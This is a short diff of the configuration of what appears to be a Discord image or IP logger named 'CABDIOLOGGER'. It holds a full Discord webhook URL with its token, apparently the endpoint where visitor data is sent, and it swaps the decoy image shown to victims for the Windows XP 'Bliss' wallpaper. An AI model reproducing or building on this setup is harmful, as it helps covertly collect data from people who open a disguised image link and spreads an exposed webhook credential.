@@ -11,7 +11,7 @@ __author__ = "cabdio"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1431292618653831340/Xkl4ozFKAQ97e7hy31S79MIC4wjlCAe5m0_oJKsyA9-_NYj1MQHZSIOHoMlR42a6QqTu",
-    "image": "https://stickerly.pstatic.net/sticker_pack/eNrxqOuc388RTr1MVqOg/BKPGHG/16/61453289.png", 
+    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
